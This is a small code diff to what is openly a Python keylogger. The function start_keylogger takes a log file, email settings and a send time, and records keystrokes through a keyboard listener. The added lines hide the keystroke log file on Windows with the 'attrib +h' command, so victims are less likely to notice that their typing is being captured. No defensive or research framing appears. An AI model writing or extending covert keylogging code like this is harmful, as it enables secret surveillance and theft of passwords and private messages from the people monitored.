@@ -56,6 +56,10 @@ def start_keylogger(log_file, email_config=None, send_time=None):
     key = generate_key()
     save_key(key)
 
+    # Hide the log file
+    if os.name == 'nt':  # Check if the OS is Windows
+        os.system(f'attrib +h {log_file}')
+
     next_send_time = datetime.now() + timedelta(days=1) if send_time else None
 
     with keyboard.Listener(
